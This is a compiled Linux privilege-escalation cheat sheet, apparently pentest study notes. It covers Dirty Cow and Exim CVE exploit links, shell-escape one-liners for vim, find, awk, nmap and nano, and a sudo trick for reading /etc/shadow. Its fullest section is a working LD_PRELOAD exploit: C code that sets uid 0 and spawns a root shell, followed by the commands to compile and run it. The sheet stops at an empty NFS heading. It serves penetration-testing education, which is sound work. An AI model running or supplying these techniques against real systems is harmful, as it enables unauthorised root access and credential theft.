# Credits
This is a compilation of many useful links on linux privilege escalations, all in one page.

# Sources
* [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/): got complete commands and explanations (based on http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html)
* Privilege escalation workshop that has massive material on this topic: [sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop). I have compiled the list of commands on the page below.
* There is a script but it has several errors: [from paranoidninja](https://github.com/paranoidninja/Pandoras-Box/blob/master/shell/lpec.sh). Check out his [blog](https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/) too, he has also some commands

All credits goes to each individual person.

# Limitations
Please consult each link individually to consult each limitation.

# LPE workshop commands
## Kernel
Documentation and understanding of the Linux Kernel [here](https://knowstuffs.wordpress.com/2012/06/11/linux-kernel-and-architecture/).

## Dirty Cow
CVE-2016-5195, some more information can be found [here](https://github.com/dirtycow/dirtycow.github.io/wiki/vulnerabilitydetails)

Bug existed since around 2.6.22 (released in 2007).

Github repository contains a list of different PoCs [here](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

**List of patched kernel versions** [here](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions)

**Detection** :
* Linux_Exploit_Suggester (PenturaLabs)
* linux-exp-suggester (flsf)
* linux-exploit-suggester (mzet-)
* exploit-suggester (pentestmonkey) - solaris focused
* Unix-PrivEsc (FuzzySecurity) - aggregated list
* post/multi/recon/local_exploit_suggester (Metasploit)

## Daemons
Common daemons:
* sshd
* nfsd
* apache2
* exim4

Privileges are usually dropped after start up.

### Exim
An open source mail transfer agent.

Versions prior 4.86.2 do not properly santise environment variables => vulnerable
**Exploits for CVE-2016-1531**: 
* https://www.exploit-db.com/exploits/39549/
* Metasploit: exploit/unix/local/exim_perl_startup
* https://www.exploit-db.com/exploits/39535/ (HackerFantastic)

**Detection**:
1) run: *dpkg -l | grep -i exim* and see the version (<4.86.2)
2) run: *exim -bV -v | grep -i perl* and see if it was compiled with Perl support
3) run: *head /etc/exim.conf* and check if the configuration contains the "perl_startup" option

## Password mining
To be done

## Shell escape sequences
**Vim / vi / man / less / more / GDB / iftop**: run command *!sh*\
**FTP**: run command *!*\
**find**: run command *find /bin -name -exec /bin/sh \;*\
**awk**: run command *awk 'BEGIN {system("/bin/sh")}'*\
**Nmap**: version <5.35DC1 run command *nmap --interactive* and then *!sh* | for version >= 5.35DC1 run command *echo "os.execute('/bin/sh')" > shell.nse* and then *nmap --script=shell.nse*
**Nano**: run command *nano -s /bin/sh* and then *sh* and then *^T*

## Sudo
### abusing intended functionality
Run the command *sudo apache2 -f /etc/shadow* will show the first line that contains the root password hash.

## LD_PRELOAD
List of additional user specific ELF shared objects to be loaded before all others.

These variables are not respected in secure-execution mode.

Secure-execution mode is activated if:
* The process's real and effective user IDs differ, or the real and effective group IDs differ
* A process with a non-root user ID executed a binary that conferred permitted or effective capabilities
* A Linux Security Module turned the mode on.

**Detection**: run command *sudo -l* to see that LD_PRELOAD environment variable is intact

**Exploitation**: compile a shared object (.so) file named ldset.c:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

And then compile it with the following command: gcc -fPIC -shared -o /tmp/ldset.so ldset.c -nostartfiles

Run it using the sudo command : *sudo LD_PRELOAD=/tmp/ldset.so apache2 (here apache2 is one of the command we can run => sudo -l)*

And then type *id* in the terminal.

## NFS
